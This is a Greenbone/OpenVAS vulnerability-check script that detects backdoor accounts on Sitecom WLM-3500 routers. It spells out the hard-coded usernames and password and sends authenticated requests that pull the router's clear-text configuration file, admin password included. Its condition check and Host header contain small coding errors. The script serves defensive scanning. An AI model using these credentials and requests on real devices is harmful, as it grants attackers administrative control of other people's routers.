# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803193");
  script_version("2023-02-28T10:20:42+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-02-28 10:20:42 +0000 (Tue, 28 Feb 2023)");
  script_tag(name:"creation_date", value:"2013-04-18 15:27:50 +0530 (Thu, 18 Apr 2013)");
  script_name("Sitecom WLM-3500 Backdoor Accounts (HTTP)");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/526372");
  script_xref(name:"URL", value:"http://comments.gmane.org/gmane.comp.security.bugtraq/51700");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/sitecom-wlm-3500-backdoor-accounts");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Default Accounts");
  script_dependencies("gb_get_http_banner.nasl", "gb_default_credentials_options.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ADSL_MODEM/banner");
  script_exclude_keys("default_credentials/disable_default_account_checks");

  script_tag(name:"impact", value:"Successful exploitation will let the remote attacker to access
  the web interface of the affected devices using two distinct hard-coded users.");

  script_tag(name:"affected", value:"Sitecom WLM-3500 devices with firmware versions prior to
  1.07.");

  script_tag(name:"solution", value:"Update to firmware version 1.07 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Sitecom WLM-3500 routers contain an undocumented access
  backdoor.");

  script_tag(name:"insight", value:"These hard-coded accounts are persistently stored inside the
  device firmware image. Despite these users cannot access all the pages of the web interface, they
  can still access page '/romfile.cfg', the (clear-text) configuration file of the device that
  contains, among the other things, also the password for the 'admin' user. Thus, escalating to
  administrative privileges is trivial.");

  exit(0);
}

if(get_kb_item("default_credentials/disable_default_account_checks"))
  exit(0);

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port: port);
if('WWW-Authenticate: Basic realm="ADSL Modem"' >!< banner){
  exit(0);
}

## Request for the restricted file romfile.cfg
url = '/romfile.cfg';
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

host = http_host_name(port:port);

if("401 Unauthorized" >< buf)
{
  cookie = eregmatch(pattern:string("Set-Cookie: ([^\r\n ]+)"), string:buf);
  if(cookie[1]== NULL){
    exit(0);
  }

  users = make_list("user3", "qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerty"+
                    "uiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopq" +
                    "wertyuiopqwertyuiopqwertyui");

  ## common password for both the users
  pwd = "1234567890123456789012345678901234567890123456789012345678901234567" +
        "8901234567890123456789012345678901234567890123456789012345678";

  foreach user (users)
  {
    userpass = user + ":" + pwd;
    userpass64 = base64(str: userpass);

    req = string("GET ",url," HTTP/1.0\r\n",
                 "Host: ", port,"\r\n",
                 "Cookie: ", cookie[1],"\r\n",
                 "Authorization: Basic ",userpass64,"\r\n\r\n");

    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    if("<ROMFILE>" >< buf  && '"Sitecom' >< buf &&
       "USERNAME=" >< buf &&  "PASSWORD=" && buf)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
